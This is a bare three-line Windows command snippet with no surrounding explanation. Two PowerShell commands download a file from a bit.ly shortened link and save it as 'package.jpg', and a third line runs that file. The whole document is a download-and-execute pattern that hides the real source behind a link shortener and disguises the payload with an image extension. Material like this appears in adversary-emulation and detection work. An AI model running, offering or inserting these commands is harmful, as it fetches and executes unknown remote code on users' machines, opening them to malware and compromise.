%SYSTEMROOT%\System32\WindowsPowerShell\v1.0\powershell.exe -Command "(New-Object Net.WebClient).DownloadFile('https://bit.ly/2K3kRlh', 'package.jpg')"
%SYSTEMROOT%\System32\WindowsPowerShell\v1.0\powershell.exe -Command "Invoke-WebRequest https://bit.ly/2K3kRlh -OutFile package.jpg"
.\package.jpg
